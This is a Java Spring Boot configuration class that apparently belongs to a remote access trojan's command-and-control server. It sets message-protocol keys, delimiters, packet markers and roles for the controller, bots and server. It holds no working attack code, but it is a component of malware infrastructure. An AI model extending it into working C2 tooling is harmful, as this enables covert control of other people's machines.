package devs.alex.sah.rat.c2server.configuration;
import org.springframework.boot.context.properties.ConfigurationProperties;
import org.springframework.boot.context.properties.ConstructorBinding;
import org.springframework.boot.context.properties.bind.DefaultValue;

@ConstructorBinding
@ConfigurationProperties("message")
public class MessagesConfiguration{ // FIXME Create annotation to validate custom values

    public final Keys keys;
    public final Delimiters delimiters;
    public final Packages packages;
    public final Targets targets;

    public MessagesConfiguration(Keys keys,
                                 Delimiters delimiters,
                                 Packages packages,
                                 Targets targets) {
        this.keys = keys;
        this.delimiters = delimiters;
        this.packages = packages;
        this.targets = targets;
    }

    public static class Keys {

        public final String packageType;
        public final String targetType;
        public final String targetID;
        public final String targetModule;
        public final String requestID;
        public final String responseType;
        public final String fullMessageSize;
        public final String isLast;

        // TODO custom Keys validation
        public Keys(@DefaultValue("PT")  String packageType,
                    @DefaultValue("TT")  String targetType,
                    @DefaultValue("TID") String targetID,
                    @DefaultValue("TM")   String targetModule,
                    @DefaultValue("RID") String requestID,
                    @DefaultValue("RT") String responseType,
                    @DefaultValue("FS")  String fullMessageSize,
                    @DefaultValue("L")   String isLast) {
            this.packageType = packageType;
            this.targetType = targetType;
            this.targetID = targetID;
            this.targetModule = targetModule;
            this.requestID = requestID;
            this.responseType = responseType;
            this.fullMessageSize = fullMessageSize;
            this.isLast = isLast;
        }
    }

    // TODO custom Keys validation
    public static class Delimiters {
        public final String section;
        public final String value;
        public Delimiters(@DefaultValue("#") String section, @DefaultValue(":") String value) {
            this.section = section;
            this.value = value;
        }
    }


    // TODO custom Keys validation
    public static class Packages {
        public final String firstPart;
        public final String continuation;
        public final String lastPart;
        public final String singleMessage;

        public Packages(@DefaultValue("f") String firstPart,
                        @DefaultValue("c") String continuation,
                        @DefaultValue("l") String lastPart,
                        @DefaultValue("s") String singleMessage) {
            this.firstPart = firstPart;
            this.continuation = continuation;
            this.lastPart = lastPart;
            this.singleMessage = singleMessage;
        }
    }

    // TODO custom Keys validation
    public static class Targets {
        public final String controlSide;
        public final String botSide;
        public final String serverSide;
        public Targets(@DefaultValue("c") String controlSide,
                       @DefaultValue("b") String botSide,
                       @DefaultValue("s") String serverSide) {
            this.controlSide = controlSide;
            this.botSide = botSide;
            this.serverSide = serverSide;
        }
    }

}
